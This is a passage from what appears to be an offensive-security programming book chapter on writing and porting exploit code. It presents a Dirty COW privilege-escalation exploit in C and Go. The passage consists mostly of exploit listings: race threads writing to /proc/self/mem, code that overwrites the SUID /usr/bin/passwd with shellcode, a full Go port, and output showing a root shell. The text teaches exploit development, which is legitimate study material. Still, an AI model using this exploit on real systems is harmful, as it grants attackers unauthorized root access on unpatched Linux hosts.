    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)
    if err != nil {
        log.Fatal(err)
    }
前沿信安资讯阵地  公众号：i nf osrc
206   Chapter 9
    for i := 0; i < 1000000; i++ {
        select {
        case <- signals: u
            fmt.Println("procselfmem done")
            return
        default:
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET)) w
            f.Write(payload) x
        }
    }
}
Listing 9-9: Race condition functions in Go
The race condition functions use variations for signaling u. Both func-
tions contain for loops that iterate an extensive number of times. The C ver-
sion checks the value of the stop variable, while the Go version uses a select 
statement that attempts to read from the signals channel. When a signal 
is present, the function returns. In the event that no signal is waiting, the 
default case executes. The primary differences between the madvise() and 
procselfmem() functions occur within the default case. Within our madvise() 
function, you issue a Linux system call to the madvise() v function, whereas 
your procselfmem() function issues Linux system calls to lseek() w and 
writes your payload to memory x.
Here are the main differences between the C and Go versions of 
these functions:
•
The Go version uses a channel to determine when to prematurely break 
the loop, while the C function uses an integer value to signal when to 
break the loop after the thread race condition has occurred.
•
The Go version uses the syscall package to issue Linux system calls. The 
parameters passed to the function include the system function to be 
called and its required parameters. You can find the name, purpose, 
and parameters of the function by searching Linux documentation. 
This is how we are able to call native Linux functions.
Now, let’s review the waitForWrite() function, which monitors for the 
presence of changes to SUID in order to execute the shellcode. The C ver-
sion is shown in Listing 9-10, and the Go version is shown in Listing 9-11.
void *waitForWrite(void *arg) {
    char buf[sc_len];
    u for(;;) {
        FILE *fp = fopen(suid_binary, "rb");
        fread(buf, sc_len, 1, fp);
        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary);
            break;
        }
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   207
        fclose(fp);
        sleep(1);
    }
    v stop = 1;
    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");
    w system(suid_binary);
}
Listing 9-10: The waitForWrite() function in C
func waitForWrite() {
    buf := make([]byte, len(sc))
    u for {
        f, err := os.Open(SuidBinary)
        if err != nil {
            log.Fatal(err)
        }
        if _, err := f.Read(buf); err != nil {
            log.Fatal(err)
        }
        f.Close()
        if bytes.Compare(buf, sc) == 0 {
            fmt.Printf("%s is overwritten\n", SuidBinary)
            break
        }
        time.Sleep(1*time.Second)
    }
    v signals <- true
    signals <- true
    fmt.Println("Popping root shell")
    fmt.Println("Don't forget to restore /tmp/bak\n")
    attr := os.ProcAttr {
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
    }
    proc, err := os.StartProcess(SuidBinary, nil, &attr) w
    if err !=nil {
        log.Fatal(err)
    }
    proc.Wait()
    os.Exit(0)
}
Listing 9-11: The waitForWrite() function in Go
前沿信安资讯阵地  公众号：i nf osrc
208   Chapter 9
In both cases, the code defines an infinite loop that monitors the SUID 
binary file for changes u. While the C version uses memcmp() to check whether 
the shellcode has been written to the target, the Go code uses bytes.Compare(). 
When the shellcode is present, you’ll know the exploit succeeded in overwrit-
ing the file. You then break out of the infinite loop and signal the running 
threads that they can now stop v. As with the code for the race conditions, 
the Go version does this via a channel, while the C version uses an integer. 
Lastly, you execute what is probably the best part of the function: the SUID 
target file that now has your malicious code within it w. The Go version is 
a little bit more verbose, as you need to pass in attributes corresponding to 
stdin, stdout, and stderr: files pointers to open input files, output files, and 
error file descriptors, respectively.
Now let’s look at our main() function, which calls the previous functions 
necessary to execute this exploit. Listing 9-12 shows the C version, and 
Listing 9-13 shows the Go version. 
int main(int argc,char *argv[]) {
    char *backup;
    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);
    u asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);
    v f = open(suid_binary,O_RDONLY);
    fstat(f,&st);
    printf("Size of binary: %d\n", st.st_size);
    w char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);
    x map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    printf("Racing, this may take a while..\n");
    y pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);
    pthread_join(pth3, NULL);
    return 0;
}
Listing 9-12: The main() function in C
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   209
func main() {
    fmt.Println("DirtyCow root privilege escalation")
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
    u backup := exec.Command("cp", SuidBinary, "/tmp/bak")
    if err := backup.Run(); err != nil {
        log.Fatal(err)
    }
    v f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)
    if err != nil {
        log.Fatal(err)
    }
    st, err := f.Stat()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("Size of binary: %d\n", st.Size())
    w payload := make([]byte, st.Size())
    for i, _ := range payload {
        payload[i] = 0x90
    }
    for i, v := range sc {
        payload[i] = v
    }
    x mapp, _, _ = syscall.Syscall6(
        syscall.SYS_MMAP,
        uintptr(0),
        uintptr(st.Size()),
        uintptr(syscall.PROT_READ),
        uintptr(syscall.MAP_PRIVATE),
        f.Fd(),
        0,
    )
    fmt.Println("Racing, this may take a while..\n")
    y go madvise()
    go procselfmem(payload)
    waitForWrite()
}
Listing 9-13: The main() function in Go
The main() function starts by backing up the target executable u. Since 
you’ll eventually be overwriting it, you don’t want to lose the original ver-
sion; doing so may adversely affect the system. While C allows you to run 
an operating system command by calling system() and passing it the entire 
command as a single string, the Go version relies on the exec.Command() func-
tion, which requires you to pass the command as separate arguments. Next, 
you open the SUID target file in read-only mode v, retrieving the file stats, 
前沿信安资讯阵地  公众号：i nf osrc
210   Chapter 9
and then use them to initialize a payload slice of identical size as the tar-
get file w. In C, you fill the array with NOP (0x90) instructions by calling 
memset(), and then copy over a portion of the array with your shellcode by 
calling memcpy(). These are convenience functions that don’t exist in Go. 
Instead, in Go, you loop over the slice elements and manually populate 
them one byte at a time. After doing so, you issue a Linux system call to 
the mapp() function x, which maps the contents of your target SUID file to 
memory. As for previous system calls, you can find the parameters needed 
for mapp() by searching the Linux documentation. You may notice that the 
Go code issues a call to syscall.Syscall6() rather than syscall.Syscall(). The 
Syscall6() function is used for system calls that expect six input parameters, 
as is the case with mapp(). Lastly, the code spins up a couple of threads, call-
ing the madvise() and procselfmem() functions concurrently y. As the race 
condition ensues, you call your waitForWrite() function, which monitors for 
changes to your SUID file, signals the threads to stop, and executes your 
malicious code.
For completeness, Listing 9-14 shows the entirety of the ported Go code.
var mapp uintptr
var signals = make(chan bool, 2)
const SuidBinary = "/usr/bin/passwd"
var sc = []byte{
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    --snip--
    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}
func madvise() {
    for i := 0; i < 1000000; i++ {
        select {
        case <- signals:
            fmt.Println("madvise done")
            return
        default:
            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)
        }
    }
}
func procselfmem(payload []byte) {
    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)
    if err != nil {
        log.Fatal(err)
    }
    for i := 0; i < 1000000; i++ {
        select {
        case <- signals:
            fmt.Println("procselfmem done")
            return
        default:
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   211
            f.Write(payload)
        }
    }
}
func waitForWrite() {
    buf := make([]byte, len(sc))
    for {
        f, err := os.Open(SuidBinary)
        if err != nil {
            log.Fatal(err)
        }
        if _, err := f.Read(buf); err != nil {
            log.Fatal(err)
        }
        f.Close()
        if bytes.Compare(buf, sc) == 0 {
            fmt.Printf("%s is overwritten\n", SuidBinary)
            break
        }
        time.Sleep(1*time.Second)
    }
    signals <- true
    signals <- true
    fmt.Println("Popping root shell")
    fmt.Println("Don't forget to restore /tmp/bak\n")
    attr := os.ProcAttr {
        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
    }
    proc, err := os.StartProcess(SuidBinary, nil, &attr)
    if err !=nil {
        log.Fatal(err)
    }
    proc.Wait()
    os.Exit(0)
}
func main() {
    fmt.Println("DirtyCow root privilege escalation")
    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
    backup := exec.Command("cp", SuidBinary, "/tmp/bak")
    if err := backup.Run(); err != nil {
        log.Fatal(err)
    }
    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)
    if err != nil {
        log.Fatal(err)
    }
    st, err := f.Stat()
    if err != nil {
前沿信安资讯阵地  公众号：i nf osrc
212   Chapter 9
        log.Fatal(err)
    }
    fmt.Printf("Size of binary: %d\n", st.Size())
    payload := make([]byte, st.Size())
    for i, _ := range payload {
        payload[i] = 0x90
    }
    for i, v := range sc {
        payload[i] = v
    }
    mapp, _, _ = syscall.Syscall6(
        syscall.SYS_MMAP,
        uintptr(0),
        uintptr(st.Size()),
        uintptr(syscall.PROT_READ),
        uintptr(syscall.MAP_PRIVATE),
        f.Fd(),
        0,
    )
    fmt.Println("Racing, this may take a while..\n")
    go madvise()
    go procselfmem(payload)
    waitForWrite()
}
Listing 9-14: The complete Go port (/ch-9/dirtycow/main.go/)
To confirm that your code works, run it on your vulnerable host. There’s 
nothing more satisfying than seeing a root shell.
alice@ubuntu:~$ go run main.go
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
/usr/bin/passwd is overwritten
Popping root shell
procselfmem done
Don't forget to restore /tmp/bak
root@ubuntu:/home/alice# id
uid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)
As you can see, a successful run of the program backs up the /usr/bin 
/passwd file, races for control of the handle, overwrites the file location with 
the newly intended values, and finally produces a system shell. The output 
of the Linux id command confirms that the alice user account has been 
elevated to a uid=0 value, indicating root-level privilege.
前沿信安资讯阵地  公众号：i nf osrc